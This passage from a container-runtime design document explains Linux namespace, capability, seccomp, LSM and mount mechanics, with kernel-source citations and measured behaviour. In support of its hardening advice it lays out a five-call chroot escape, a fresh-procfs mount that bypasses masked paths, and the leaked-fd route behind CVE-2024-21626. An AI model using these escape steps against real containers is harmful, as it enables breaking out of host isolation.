`clone(flags & CLONE_NEWUSER)` but not a pathname. Pointer-dependent decisions need
`SECCOMP_RET_USER_NOTIF` and a supervising process.

**Omit it and:** every syscall the kernel implements is reachable. The practical consequence is not
"the container can call `reboot`" (that needs `CAP_SYS_BOOT`) but that the entire kernel attack
surface — every past and future LPE in an obscure syscall — is live.

### 2.5 LSMs (AppArmor / SELinux)

**Fact.** An LSM adds a second, independent authorisation layer at kernel hook points, keyed on a
process label rather than on uid or capability. A container is confined by writing a profile name to
`/proc/self/attr/apparmor/exec` (or `/proc/self/attr/exec` for SELinux) before `execve`; the label
takes effect at the exec. The LSM decision is an **AND** with the DAC and capability decision —
nothing an LSM does grants access, it only removes it.

**Omit it and:** nothing visibly breaks. The loss is the layer that catches what capability and
seccomp policy missed — most usefully, it is what stops a `CAP_SYS_ADMIN`-holding container from
writing the specific `/proc` and `/sys` files that every published escape targets.

**Convention.** Docker ships a generated AppArmor profile (`docker-default`) on Ubuntu/Debian hosts
and SELinux `container_t` labelling on RHEL-family hosts. Neither is required by the OCI runtime
spec, which only carries the label string.

### 2.6 The filesystem root change

**Fact.** `pivot_root(new_root, put_old)` changes the **root mount of the caller's mount namespace**:
it moves the old root mount to `put_old` and makes `new_root` the root. Followed by
`umount2(put_old, MNT_DETACH)`, the old root has **no pathname at all** in the namespace.

**Fact.** `chroot(2)` is not an alternative, and the man page says why: "This call changes an
ingredient in the pathname resolution process and does nothing else. … This call does not change the
current working directory, so that after the call `.` can be outside the tree rooted at `/`. … This
call does not close open file descriptors, and such file descriptors may allow access to files
outside the chroot tree." The escape is five calls and was executed in full on kernel 6.11.0-29:
`open("/outside", O_DIRECTORY)` *before* the chroot; `chroot("/jail")`; `fchdir(fd)` — the cwd is now
outside the root; `chdir("..")` ×64 — `follow_dotdot()` stops at the *process's* root only when the
cwd is inside it; `chroot(".")`. It requires `CAP_SYS_CHROOT`.

**Convention.** `CAP_SYS_CHROOT` is one of Docker's default 14 capabilities, so the escape above is
available to an ordinary unprivileged container under default settings.

**Fact.** `pivot_root` fixes both halves: the old tree is no longer mounted in the namespace, and
there is no path from which `..` can walk out. It does not fix the fd half — see §2.8.

**Omit it and:** the container's `/` is the host's `/`. There is no container.

### 2.7 Classification

**Absolutely required** = there is no container without it. **Strongly recommended** = the container
runs but real software breaks. **Security hardening** = raises the cost of an escape by an attacker
already inside. **Docker-specific convenience** = compatibility or UX, no isolation value.

| Mechanism | Tier | Why this tier |
|---|---|---|
| `CLONE_NEWNS` (mount) | **required** | No private rootfs; `pivot_root` would repoint the host |
| `CLONE_NEWPID` | **required** | Otherwise the container signals and enumerates host processes |
| fresh `/proc` instance | **required** | A PID namespace alone shows all host PIDs (measured, §2.1.2) |
| `pivot_root` + `MNT_DETACH` of the old root | **required** | `chroot` is escapable in five calls (§2.6) |
| rootfs parent `MS_PRIVATE` + recursive self-bind of the rootfs | **required** | `pivot_root` preconditions; and it is what makes the container's own mounts non-propagating |
| `/dev` tmpfs + the six core nodes | **required** | Without `/dev/null`, `echo x > /dev/null` silently creates a growing regular file |
| cgroup placement | **required** | Unbounded container; and `cgroup.kill` is the only reliable teardown of last resort |
| `CLONE_NEWNET` | **required for isolation** | Otherwise the container binds host ports and sniffs host traffic |
| `/dev/pts` (devpts) | **required in practice** | `openpty()` → "out of pty devices"; no `-it`, no `exec -it`, no `ssh`, no password prompt |
| `CLONE_NEWIPC` | strongly recommended | SysV crosstalk and global-limit exhaustion; enables `mount -t mqueue` in a userns |
| `CLONE_NEWUTS` | strongly recommended | Two strings, one syscall; without it `hostname` renames the host |
| `CLONE_NEWCGROUP` | strongly recommended | Prerequisite for a correct `/sys/fs/cgroup`; a real migration boundary under `nsdelegate` (§2.1.7) |
| `MS_REC\|MS_SLAVE` on `/` | strongly recommended; **required once volumes exist** | Bind-mounted volumes inherit the *source's* peer group; also blocks outbound umount propagation at teardown |
| `/dev/shm` tmpfs | strongly recommended | `shm_open`, `sem_open`, Python `multiprocessing`, PostgreSQL, Chromium |
| `/sys` read-only | strongly recommended | `lsblk`, `lscpu`, `lspci`, udev, D-Bus, interface attributes |
| an init process as PID 1 | strongly recommended; not required | Only way to make `SIGTERM` deliverable at all (§2.1.2); reaps orphans |
| capability bounding-set drop | **hardening — the highest-value one** | `CAP_SYS_ADMIN` in the initial userns is a one-step escape |
| seccomp filter | hardening | Removes the rest of the kernel syscall surface |
| `CLONE_NEWUSER` | hardening (the structural one) | The only mechanism that makes container root ≠ host root. Not Docker's default |
| `PR_SET_NO_NEW_PRIVS` | hardening | Neutralises setuid binaries and file capabilities inside the image |
| LSM label | hardening | Independent second layer; blocks the `/proc`/`/sys` writes escapes target |
| `nosuid,nodev,noexec` on `/proc`, `/sys`, `/dev/shm`, `/dev/mqueue` | hardening | OCI/Docker default set |
| `maskedPaths` / `readonlyPaths` | hardening — **conditional** | Per-superblock only; worthless if the container can still `mount` (§2.8) |
| device cgroup (BPF `cgroup_device`) | hardening | Gates `open()` on device nodes the container managed to create |
| `/sys/fs/cgroup` read-only | Docker convenience → required for JVM/.NET/Node | Without it, cgroup-aware runtimes size heaps against host RAM and get OOM-killed |
| `/dev/mqueue` | Docker convenience | POSIX message queues only; almost nothing uses them |
| `/dev/fd`, `/dev/std{in,out,err}` symlinks | Docker convenience | Some shell scripts |
| `CLONE_NEWTIME` | Docker convenience | `CLOCK_REALTIME` is not virtualised; default-on in Docker ≥ 29.5 but changes no observable behaviour at zero offset |

### 2.8 Process isolation is not security isolation

The distinction is mechanical, not philosophical. Three properties of the kernel decide it.

**Fact — namespaces virtualise naming, not access.** Entering a namespace does not revoke references
the process already holds. The mount namespace stops the old root from having a *pathname*; it does
not stop an `O_PATH` fd on the old root from resolving. After `umount2(put_old, MNT_DETACH)` the
mounts leave the namespace's mount tree and vanish from `/proc/self/mountinfo`, but the `struct
mount`s and superblocks live until the last reference drops, and `openat(oldroot_fd, "etc/shadow")`
still works because path resolution from a dirfd does not consult the mount tree for its starting
point. That is the mechanism of **CVE-2024-21626** — a leaked fd, not a namespace bug.

**Fact — the syscall surface is not namespaced.** A process in six namespaces still calls the one
host kernel. `mount(2)`, `bpf(2)`, `init_module(2)`, `kexec_load(2)`, `perf_event_open(2)`,
`io_uring_setup(2)` all execute host-side code. Whether they are *permitted* is decided by
capabilities, seccomp and the LSM — not by any namespace. This is why a container with
`CAP_SYS_ADMIN` in the initial user namespace is not contained in any meaningful sense: it can mount
a second procfs (procfs uses `get_tree_nodev()`, so every mount is a **fresh superblock**) and
thereby obtain a clean, unmasked `/proc` — measured on kernel 6.11.0-29, a second procfs mounted in
the same namespace produced superblock `0:67` beside the first's `0:62`, with `/proc/kcore` present.
**Masking is per-superblock, so `maskedPaths` and `readonlyPaths` are not a boundary against a
container that can still call `mount(2)`.** They only count when paired with dropping
`CAP_SYS_ADMIN` or seccomp-blocking the mount family.

**Fact — there is one kernel, one scheduler, one allocator, one set of bugs.** A use-after-free
reachable from an `ioctl` a container is allowed to issue is a host compromise regardless of how
many namespaces the caller is in. The user namespace is the only mechanism that changes this
calculus, because it re-scopes the capability checks themselves: `CAP_SYS_ADMIN` in a *nested* user
namespace does not authorise operations on host-owned objects.

**Recommendation.** State the posture, do not imply it. A container with six namespaces, a cgroup, a
pivoted root, and **no** capability drop, seccomp filter or LSM label is a *process isolation*
boundary: it prevents accidents and contains a cooperative workload. It is not a boundary against
code that is already running inside and trying to get out — it is approximately `--privileged` minus
the device cgroup. The cheapest increment that changes that is the capability bounding-set drop, not
the user namespace: it is one `prctl` loop, it is where the published escapes aim, and unlike a user
namespace it costs nothing in image compatibility.

### What this decides

| Decision | Urgency |
|---|---|
| Which namespaces the MVP creates (recommended: mount, pid, net, uts, ipc, cgroup — six, with the cgroup one unshared in the child, §4) | **Urgent** — it is the clone flag word |
| Whether the MVP ships with a capability bounding-set drop or without one | **Urgent** — it is the difference between "sandbox" and "root-equivalent", and it is ~20 lines |
| Whether `--userns-remap`-equivalent rootless is a later track or a design constraint now | Deferrable — but the sync-pipe protocol must be shaped for it today (§4) |
| Whether the engine ever promises security isolation in its documentation | **Urgent** — it is a one-paragraph honesty decision that cannot be retrofitted after users rely on it |

---

## 3. Kernel primitives

Every signature below is the real one. Every version-gated feature states its version. Where the
kernel's own documentation is wrong about its own version, that is marked **Trap.**

### 3.1 Process creation — `clone`, `clone3`, `fork`

**Fact.** All three are the same kernel entry point with different userspace wrappers.
`fork(2)` is `clone(SIGCHLD, 0)`. `clone(2)` packs the child's termination signal and the flags into
one `int`: the low byte is `CSIGNAL = 0xff`, leaving 24 usable flag bits, and **that flag space is
exhausted**. `clone3(2)` (Linux 5.3) takes a versioned struct with a 64-bit `flags` field and a
separate `exit_signal`, and is the only route to `CLONE_INTO_CGROUP`, `CLONE_CLEAR_SIGHAND`,
`CLONE_NEWTIME` and `set_tid`.

```c
long syscall(SYS_clone3, struct clone_args *cl_args, size_t size);   /* 435 */
```

**Fact.** The struct, from `v6.11/include/uapi/linux/sched.h#L107-L109` — field order matters, the
kernel reads it positionally:

```c
struct clone_args {
    __aligned_u64 flags;        /* CLONE_* — 64-bit, exit signal NOT in here */
    __aligned_u64 pidfd;        /* ptr to an int the kernel fills (CLONE_PIDFD) */
    __aligned_u64 child_tid;    /* ptr (CLONE_CHILD_SETTID / _CLEARTID) */
    __aligned_u64 parent_tid;   /* ptr (CLONE_PARENT_SETTID) */
    __aligned_u64 exit_signal;  /* e.g. SIGCHLD */
    __aligned_u64 stack;        /* LOWEST address of the child stack */
    __aligned_u64 stack_size;
    __aligned_u64 tls;
    /* ---- CLONE_ARGS_SIZE_VER0 = 64 ---- */
    __aligned_u64 set_tid;      /* ptr to a pid_t array (Linux 5.5) */
    __aligned_u64 set_tid_size;
    /* ---- CLONE_ARGS_SIZE_VER1 = 80 ---- */
    __aligned_u64 cgroup;       /* fd on a cgroup v2 dir (Linux 5.7) */
    /* ---- CLONE_ARGS_SIZE_VER2 = 88 ---- */
};
```

The kernel asserts these offsets at build time (`v6.11/kernel/fork.c#L2937-L2942`,
`BUILD_BUG_ON(offsetofend(struct clone_args, tls) != CLONE_ARGS_SIZE_VER0)` and two more).

**Fact — the size-versioning rule**, one rule, from `copy_struct_from_user`
(`v6.11/include/linux/uaccess.h`):

> * If `usize == ksize`, copied verbatim.
> * If `usize < ksize`, userspace passed an old struct to a newer kernel: the trailing bytes are
>   zero-filled.
> * If `usize > ksize`, userspace passed a new struct to an older kernel: the trailing bytes
>   **unknown to the kernel are checked to be zero**, otherwise `-E2BIG`.

Per-syscall guards around that shared helper:

| syscall | lower bound | upper bound |
|---|---|---|
| `clone3` | `size < 64` → `EINVAL` | `size > PAGE_SIZE` → `E2BIG` |
| `mount_setattr` | `size < 32` → `EINVAL` | `size > PAGE_SIZE` → `E2BIG` |
| `openat2` | `size < 24` → `EINVAL` | none — relies entirely on `copy_struct_from_user` |

**Recommendation.** Zero-initialise the whole struct and set only the fields you mean; always pass
`sizeof(struct clone_args)` from a pinned UAPI definition. Forward compatibility is "zero means
default", so a partially filled uninitialised struct hands the kernel garbage in
`set_tid`/`cgroup` and gets `E2BIG` on an old kernel — or, worse, is *accepted* and acted on.

> **Trap.** `CLONE_INTO_CGROUP` requires the **full** size. `v6.11/kernel/fork.c`:
> `if ((args.flags & CLONE_INTO_CGROUP) && (args.cgroup > INT_MAX || usize < CLONE_ARGS_SIZE_VER2))
> return -EINVAL;`. An implementation that "plays it safe" by passing 64 to maximise kernel
> compatibility silently loses race-free cgroup placement and gets `EINVAL` with no hint why. The
> compatibility worry it was solving does not exist — the rule above already handles an older
> kernel.

> **Trap.** The exit signal moves. Legacy `clone` ORs it into the flags word; `clone3` **rejects**
> that. `clone3_args_valid`: `if (kargs->flags & (CLONE_DETACHED | (CSIGNAL & (~CLONE_NEWTIME))))
> return false;`. With `clone3` the signal goes in `cl_args.exit_signal` and the low byte of `flags`
> must be clear. A transliterated `clone()` call gets `EINVAL` and no explanation.

**Fact — stack.** For `clone3`, `stack` is the **lowest** address of the child stack (legacy
`clone` takes the top). `stack == 0 && stack_size == 0` is valid and gives `fork(2)` semantics: the
child resumes on a copy-on-write copy of the parent's stack. Exactly one of the two being zero is
`EINVAL`. For our use — no `CLONE_VM` — both zero is correct and no stack needs allocating.

**Fact — `CLONE_PIDFD` (Linux 5.2).** `cl_args.pidfd` is a pointer to an `int` the kernel fills with
a pidfd for the new child, obtained race-free at creation. `CLONE_PIDFD | CLONE_DETACHED` →
`EINVAL`; with *legacy* `clone` only, `CLONE_PIDFD | CLONE_PARENT_SETTID` → `EINVAL` because they
share the `parent_tid` slot (`v6.11/kernel/fork.c#L2176-L2183`, `#L2758`).
`CLONE_PIDFD | CLONE_THREAD` is now legal (`#L2403`), contradicting older documentation.

**Fact — `CLONE_INTO_CGROUP` (Linux 5.7).** cgroup **v2 only**. `cl_args.cgroup` is an fd on a
cgroup v2 directory opened `O_RDONLY` or `O_PATH`; the child is attached to it by
`cgroup_can_fork()`/`cgroup_post_fork()` and is in it from its first instruction. All the usual
restrictions on placing a process into a v2 cgroup apply (no-internal-process rule, delegation).
Measured on kernel 6.11.0-29: `clone3(flags=CLONE_INTO_CGROUP, cgroup=<bogus fd>)` returns `EBADF`,
not `EINVAL` — the flag is recognised and validated.

**Fact — `CLONE_PARENT`.** A namespace init **cannot** use it: `v6.11/kernel/fork.c#L2162`,
`if ((clone_flags & CLONE_PARENT) && current->signal->flags & SIGNAL_UNKILLABLE) return
ERR_PTR(-EINVAL);` with the comment "prevent global and container-inits from creating siblings". And
`clone3` rejects `CLONE_PARENT`/`CLONE_THREAD` together with a nonzero `exit_signal`
(`clone3_args_valid`, `v6.11/kernel/fork.c#L3043`).

> **Trap.** `clone(2)`'s ERRORS section claims "`EINVAL`: `CLONE_NEWPID` and one (or both) of
> `CLONE_THREAD` or `CLONE_PARENT` were specified". For `CLONE_PARENT` that is **false** on modern
> kernels. Measured, kernel 6.11.0-29, `clone3` with `exit_signal = 0`: `CLONE_NEWPID` → ok;
> `CLONE_NEWPID|CLONE_PARENT` → **ok, no error**; `CLONE_PARENT` → ok. No such check exists in
> `v6.11/kernel/fork.c` nor in `v4.18/kernel/fork.c`. The `CLONE_THREAD` half of that sentence *is*
> still enforced (`#L2170-L2173`). runc's source corroborates a *historical* restriction
> (`nsexec.c`: "there were some old kernel versions where `clone(CLONE_PARENT | CLONE_NEWPID)` was
> broken").

**Fact — `fork(2)` is not a thin wrapper, and that is why a raw `clone3` is more dangerous than it
looks.** `glibc-2.40/posix/fork.c` runs, when the process is multithreaded: `__run_prefork_handlers`
(registered `pthread_atfork` handlers), `_IO_list_lock()`, `__malloc_fork_lock_parent()` (takes
`list_lock` and **every arena mutex**) — then the clone — then, in the child,
`__malloc_fork_unlock_child()`, `fresetlockfiles()` (resets every `FILE*`'s recursive mutex),
`_IO_list_resetlock()`, `__rtld_lock_initialize(GL(dl_load_lock))` and `dl_load_tls_lock`,
`reclaim_stacks()` (splices every other thread off `dl_stack_used`), and the child `atfork`
handlers. **A raw `syscall(SYS_clone3, …)` runs none of it.** The correct statement is therefore not
"fork is dangerous" but *a raw `clone`/`clone3` is strictly more dangerous than `fork()`, because
`fork()` has a documented recovery path and `clone3` has none.* `signal-safety(7)` (man-pages 6.19)
makes the same point by omission: it lists `_Fork(3)` as async-signal-safe and does **not** list
`fork(2)` at all. A raw-`clone3` child is in `_Fork`'s position — async-signal-safe functions only,
and nobody has repaired anything on its behalf. The consequences for the child are §4's steps
"flush stdio before the clone", "pre-build every string", and "use raw `setresuid`, not glibc's".

### 3.2 `unshare(2)` — what it can and cannot do in-process

```c
int unshare(int flags);
```

**Fact.** `unshare` moves the **calling thread** into freshly created namespaces. Which flags
actually move the caller:

| Flag | Moves the caller? | Notes |
|---|---|---|
| `CLONE_NEWNS` | **yes**, immediately | works multithreaded; only the calling thread moves |
| `CLONE_NEWUTS`, `CLONE_NEWIPC`, `CLONE_NEWNET`, `CLONE_NEWCGROUP` | **yes**, immediately | work multithreaded |
| `CLONE_NEWUSER` | **yes** — but only from a single-threaded process | see below |
| `CLONE_NEWPID` | **no** — children only | `ns/pid` unchanged, `ns/pid_for_children` changes |
| `CLONE_NEWTIME` | **no** — children only | `ns/time_for_children` changes; offsets must be set before anyone is inside |

**Fact — why `CLONE_NEWPID` only affects children.** `setns(2)` states the reason explicitly:
"Reassociating the calling thread with a PID namespace changes only the PID namespace that
subsequently created child processes of the caller will be placed in; it does not change the PID
namespace of the caller itself." Changing a live process's own `getpid()` would break every program
that cached it. Consequence: on the `unshare` path you need an extra fork to get a process inside;
on the `clone` path you do not, because the child is **born** as PID 1 of the new namespace.
Measured, kernel 6.11.0-29: `clone3(CLONE_PIDFD|CLONE_NEWPID)` → the child's `getpid()` is `1`.

**Fact — the first process in a new PID namespace is load-bearing.** `unshare -p sh -c '…'`
demonstrates all three rules at once on kernel 6.11.0-29: `$$` is still a host-scale PID (the caller
did not move); the first forked child lands in the new namespace as its PID 1; when that child exits
the namespace is permanently unusable and the next `fork` fails `ENOMEM`
(`pid_namespaces(7)`: "it is not possible to create a new process in a PID namespace whose 'init'
process has terminated").

**Fact — `CLONE_NEWPID` is once per process.** A second `unshare(CLONE_NEWPID)` in the same process
returns `EINVAL`. Nesting is capped at 32 levels since Linux 3.7 (`ENOSPC` beyond).

**Fact — `CLONE_NEWUSER` is the only namespace flag a multithreaded process cannot unshare.** The
mechanism, from `v6.11/kernel/fork.c#L3268` (`ksys_unshare`): unsharing a user namespace forces
`CLONE_THREAD|CLONE_FS` as well; `check_unshare_flags` (`#L3195`) then rejects `CLONE_THREAD` when
`!thread_group_empty(current)` → `EINVAL`. Measured per-flag from a 4-thread process on kernel
6.11.0-29: `NEWNS`, `NEWPID`, `NEWNET`, `NEWUTS`, `NEWTIME`, `NEWCGROUP` all return 0; `NEWUSER`
returns `EINVAL`. The undocumented side effect: it also unshares your `fs_struct`, so root and cwd
stop being shared.

**Fact.** Unsharing the user namespace **together with** the others in one call is legal, and the
new namespaces are owned by the new user namespace (`v6.11/kernel/nsproxy.c` — the capability check
uses `new_cred->user_ns`). The "userns alone first, then the rest" sequence runc uses is a
convention, not a kernel rule; runc's stated reason is an SELinux labelling problem with the
kern-mounted mqueue backing store.

**Fact — per-namespace limits.** `/proc/sys/user/max_*_namespaces`, measured at 63826 for all
eight types on kernel 6.11.0-29. Exceeding gives `ENOSPC` (`EUSERS` on Linux 3.11-4.8).

### 3.3 `setns(2)` — and the pidfd form that changes `exec`

```c
int setns(int fd, int nstype);
```

**Fact.** `setns` is **per-thread**, not per-process. The man page's title is "reassociate *thread*
with a namespace". An `unshare`/`setns` on one thread of a multithreaded process leaves the rest
behind and there is no way to fix that afterwards.

**Fact — two forms, with different rules.**

1. **nsfs form.** `fd` is an fd on `/proc/<pid>/ns/<type>` (or a bind mount of one). "Each call to
   `setns()` changes just one of the caller's namespace memberships." Joining seven namespaces means
   seven calls in a careful order (user namespace first, since the others' permission checks are
   evaluated against it), and a partially-joined process is observable in between.
2. **pidfd form — since Linux 5.8.** `fd` is a pidfd from `pidfd_open(2)` or `clone3(CLONE_PIDFD)`.
   `setns(2)`: "setns() **atomically** moves the calling thread into one or more of the same
   namespaces as the thread referred to by fd. The nstype argument is a bit mask specified by ORing
   together one or more of the `CLONE_NEW*` namespace constants." `nstype == 0` with a pidfd is
   `EINVAL`.

**Recommendation.** `mydocker exec` should use the pidfd form: one syscall instead of seven, and the
atomicity removes the partial-join hazard entirely. Keep the container's pidfd from
`clone3(CLONE_PIDFD)` as the container handle and this falls out for free.

**Fact — user namespace restrictions on `setns`.** `EINVAL` if the caller is multithreaded and tries
to join a new user namespace; `EINVAL` if the caller shares `CLONE_FS` state and tries to join a new
user namespace; `EINVAL` on joining your *own* current user namespace (measured, kernel 6.11.0-29).
`CLONE_NEWPID` and `CLONE_NEWTIME` via `setns` affect subsequently created children only, exactly as
for `unshare`.

### 3.4 Mount syscalls — the classic API

```c
int mount(const char *source, const char *target, const char *fstype,
          unsigned long mountflags, const void *data);
int umount2(const char *target, int flags);
```

**Fact.** `MS_BIND` attaches an existing subtree at a second location; without `MS_REC` it binds the
single mount only, with `MS_REC` it replicates the submount tree. **Mount options are not applied by
a bind**: `mount(2)` states that with `MS_BIND` "the `mountflags` and `data` arguments are ignored"
apart from a small documented set. Making a bind read-only or `nosuid` needs a second call with
`MS_BIND|MS_REMOUNT` and the desired flags.

> **Trap.** The two-pass `MS_BIND|MS_REMOUNT` trick is **not recursive**. A recursive read-only bind
> done this way leaves every nested submount writable, silently. `mount_setattr(2)` with
> `AT_RECURSIVE` is the only correct way, and it is Linux **5.12**.

```c
int mount_setattr(int dirfd, const char *path, unsigned int flags,
                  struct mount_attr *attr, size_t size);     /* 442, Linux 5.12 */
struct mount_attr { __u64 attr_set, attr_clr, propagation, userns_fd; };  /* exactly 32 bytes */
```

**Fact.** `mount_attr` has never been extended: the kernel asserts
`BUILD_BUG_ON(sizeof(struct mount_attr) != MOUNT_ATTR_SIZE_VER0)` (32). So the size argument is
unconditionally `sizeof(struct mount_attr)` and there is no version dance to invent.
`MOUNT_ATTR_IDMAP` plus `userns_fd` gives **idmapped mounts** (Linux 5.12), which is how a bind
mount can present different uids to the container without chowning anything on disk.

**Fact — `umount2(…, MNT_DETACH)` propagates.** `v6.11/fs/namespace.c#L1914-L1917` (`do_umount`):

```c
if (flags & MNT_DETACH) {
        if (mnt->mnt.mnt_flags & MNT_ONRB || !list_empty(&mnt->mnt_list))
                umount_tree(mnt, UMOUNT_PROPAGATE);
```

`umount_tree()` with `UMOUNT_PROPAGATE` calls `propagate_umount()` on the gathered subtree. So a
lazy unmount of a tree still in the host's peer group **removes host mounts**. This is the
first-order risk of leaving `/` shared, and it is destructive, not cosmetic.

**Fact.** `MNT_DETACH` removes mounts from the namespace's mount tree — they vanish from
`/proc/self/mountinfo` — but the `struct mount`s and their superblocks live until the last reference
drops. An fd held across the detach keeps the object reachable. See §3.7.

### 3.5 Mount syscalls — the new (fd-based) API

**Fact.** Linux **5.2** decomposed `mount(2)` into five calls:

```c
int fsopen(const char *fsname, unsigned int flags);                    /* 430 */
int fsconfig(int fd, unsigned int cmd, const char *key,
             const void *value, int aux);                              /* 431 */
int fsmount(int fs_fd, unsigned int flags, unsigned int attr_flags);   /* 432 */
int move_mount(int from_dfd, const char *from_path,
               int to_dfd, const char *to_path, unsigned int flags);   /* 429 */
int open_tree(int dfd, const char *path, unsigned int flags);          /* 428 */
int fspick(int dfd, const char *path, unsigned int flags);             /* 433 */
```

`fsopen` → a filesystem-configuration fd; `fsconfig(…, FSCONFIG_SET_STRING, key, value, 0)` one
option at a time, **with per-option error reporting** instead of one opaque `EINVAL` for a whole
option string; `fsconfig(…, FSCONFIG_CMD_CREATE, …)` instantiates the superblock; `fsmount` returns
an fd for a **detached mount** that exists but is attached nowhere; `move_mount(fd, "", dirfd, name,
MOVE_MOUNT_F_EMPTY_PATH)` attaches it. `open_tree(dirfd, path, OPEN_TREE_CLONE|AT_RECURSIVE)`
produces a detached clone of an existing subtree as an fd.

**Fact.** Three real advantages for a runtime, not aesthetics: a mount is fully configured before it
is visible anywhere; everything is fd-based, which removes the symlink-exchange/TOCTOU class of
attacks on mount target paths inside an attacker-controlled rootfs; and mount fds can be passed over
a UNIX socket with `SCM_RIGHTS`, so a privileged parent can build mounts and hand them to an
unprivileged child.

**Fact.** On failure, `read(2)` on the `fs_context` fd returns a human-readable error string. This
is the single best reason to prefer the new API independent of anything else — `EINVAL` on an
unnamed path becomes `e overlay: too many lower directories, limit is 500`.

> **Trap.** `OPEN_TREE_NAMESPACE` **does not exist**. `v6.11/include/uapi/linux/mount.h#L64-L65`
> defines exactly two `open_tree` flags, `OPEN_TREE_CLONE` (1) and `OPEN_TREE_CLOEXEC`; same at
> `v6.17`. `SYSCALL_DEFINE3(open_tree, …)` rejects anything else, and additionally rejects
> `AT_RECURSIVE` without `OPEN_TREE_CLONE`. Any design that assumed a mount namespace could be built
> out-of-band and entered with `setns`, skipping `pivot_root`, must be deleted. crun 1.29.1 contains
> a `#ifndef OPEN_TREE_NAMESPACE / #define … 2` fallback that is **never used**; every real
> `open_tree` call site uses `OPEN_TREE_CLONE`, and crun does `pivot_root` like everyone else.

**Fact — the new API's overlay-specific kernel floors**, because the rootfs materialisation step
depends on them:

| Capability | Since | Below it |
|---|---|---|
| `fsopen`/`fsconfig`/`fsmount`/`move_mount`/`open_tree` | **5.2** | `mount(2)` only |
| overlayfs converted to `fs_context` | **6.5** | `fsopen("overlay")` *silently falls back to the legacy shim*, which reassembles your `fsconfig` calls into one comma-separated options page and enforces `PAGE_SIZE` — the same ~4094-byte ceiling as `mount(2)`, but with a loud error instead of truncation |
| `lowerdir+` (one `fsconfig` call per lower layer) | **6.7** | one colon-joined string, capped at **255 bytes** under native 6.5–6.6 parsing, which is *worse* than `mount(2)` |
| `MOVE_MOUNT_BENEATH` | **6.5** | no atomic mount replacement |

> **Trap.** `Documentation/filesystems/overlayfs.rst` says "Since kernel version v6.8, directory
> names containing colons can also be configured … using the `lowerdir+` mount options." **The
> kernel's own documentation is wrong**: the code is present in `v6.7/fs/overlayfs/params.c#L148`
> (commit `24e16e385f22`, merged in `ovl-update-6.7`), and the sentence was written against the 6.8
> merge window and never corrected when the series landed a cycle early. Verified by diffing
> `params.c` across v6.6 (0 occurrences) / v6.7 (5) / v6.8 (5).

**Fact.** On the `fsconfig` path each `FSCONFIG_SET_STRING` **value** is capped at 255 bytes, and
`FSCONFIG_SET_PATH` is rejected by overlayfs. The practical floor for "mount an image with an
arbitrary number of layers without a symlink farm" is therefore **Linux 6.7**: there,
`fsopen("overlay")` + N × `fsconfig(FSCONFIG_SET_STRING, "lowerdir+", path)` + `fsmount` +
`move_mount` reaches `OVL_MAX_STACK = 500` layers with no aggregate length limit (measured at 300
layers / 4800 bytes of paths on kernel 6.11.0-29). Below 6.7 every route — `mount(2)` with
`lowerdir=`, `mount(2)` with `lowerdir+=`, `fsconfig` via the legacy shim — passes through one
4095-byte page, and the only workaround is relative paths plus `chdir` into the store root.

**Recommendation.** MVP uses `mount(2)` for the container's own mount set: one call versus five, and
every kernel has it. Structure the mount layer around *(source, target, fstype, flags, options)*
descriptors resolved against **directory fds rather than strings**, so the backend can be swapped
without a rewrite. Tradeoff stated plainly: staying on `mount(2)` keeps the symlink-TOCTOU class
alive, which is acceptable for a single-user dev tool and is not acceptable the day untrusted images
are accepted. Use `openat2(2)` with `RESOLVE_BENEATH|RESOLVE_NO_SYMLINKS` (Linux 5.6) to resolve
every target inside the rootfs in the meantime — that is one call and closes most of the gap.

### 3.6 Mount propagation

**Fact.** Four types, verbatim from `mount_namespaces(7)`:

- **`MS_SHARED`** — "This mount shares events with members of a peer group. `mount(2)` and
  `umount(2)` events immediately under this mount will propagate to the other mounts that are
  members of the peer group … Conversely, `mount(2)` and `umount(2)` events that take place under
  peer mounts will propagate to this mount." Bidirectional.
- **`MS_PRIVATE`** — "This mount is private; it does not have a peer group. `mount(2)` and
  `umount(2)` events do not propagate into or out of this mount."
- **`MS_SLAVE`** — "`mount(2)` and `umount(2)` events propagate into this mount from a (master)
  shared peer group. `mount(2)` and `umount(2)` events under this mount do not propagate to any
  peer." One-way inbound.
- **`MS_UNBINDABLE`** — "like a private mount, and in addition this mount can't be bind mounted."

**Fact — two subtleties that decide the sequence in §4.**

1. Propagation applies to events for mounts **immediately under** the mount, not grandchildren —
   hence `MS_REC` on every propagation change.
2. **Peer-group membership is copied at bind time, from the source.**
   `v6.11/fs/namespace.c#L1320-L1334` (`clone_mnt`): `if ((flag & CL_MAKE_SHARED) ||
   IS_MNT_SHARED(old)) list_add(&mnt->mnt_share, &old->mnt_share); if (IS_MNT_SLAVE(old))
   list_add(&mnt->mnt_slave, &old->mnt_slave); mnt->mnt_master = old->mnt_master;`. So a bind of a
   **shared** mount is shared *regardless of how private its destination parent is*, and a bind of a
   **private** mount is private. A fresh mount namespace is a replication, so it inherits peer-group
   membership too — which is why unsharing alone protects nothing.

| source mount state | a bind/clone of it becomes | inbound propagation to the copy? |
|---|---|---|
| shared | shared, same peer group | yes — and outbound too |
| slave | slave of the same master | yes, inbound only |
| private | private | no |

> **Trap.** `util-linux`'s `unshare -m` silently defaults to `--propagation private`, i.e. it does
> `MS_REC|MS_PRIVATE` on `/` for you. Anyone learning these mechanics at a shell is being shielded
> from the exact failures they need to see — a `pivot_root` test with a shared `/` "passes" when it
> should fail. Reproduce real kernel behaviour with `unshare -m --propagation unchanged`, nested
> inside a protective private namespace.

### 3.7 `pivot_root(2)`

```c
int syscall(SYS_pivot_root, const char *new_root, const char *put_old);   /* 155 */
```

**Fact — every precondition, checked against `v6.11/fs/namespace.c#L4301-L4395`**:

| Precondition | Kernel check | Errno |
|---|---|---|
| `CAP_SYS_ADMIN` in the userns owning the caller's **mount** ns | `may_mount()` → `ns_capable(mnt_ns->user_ns, CAP_SYS_ADMIN)`, L4308 | `EPERM` |
| `new_root` and `put_old` must be directories | `LOOKUP_DIRECTORY` in both `user_path_at`, L4311/L4316 | `ENOTDIR` |
| `new_root` must be a mount point | `!path_mounted(&new)` | `EINVAL` |
| the current root must be a mount point | `!path_mounted(&root)` | `EINVAL` |
| `new_root` must not be the current root | `new_mnt == root_mnt \|\| old_mnt == root_mnt` | **`EBUSY`** |
| `put_old` must be at or under `new_root` | `is_path_reachable(old_mnt, old.dentry, &new)`, L4367 | `EINVAL` |
| none of three mounts may be `MS_SHARED` | `IS_MNT_SHARED(old_mnt) \|\| IS_MNT_SHARED(ex_parent) \|\| IS_MNT_SHARED(root_parent)`, L4338 | `EINVAL` |
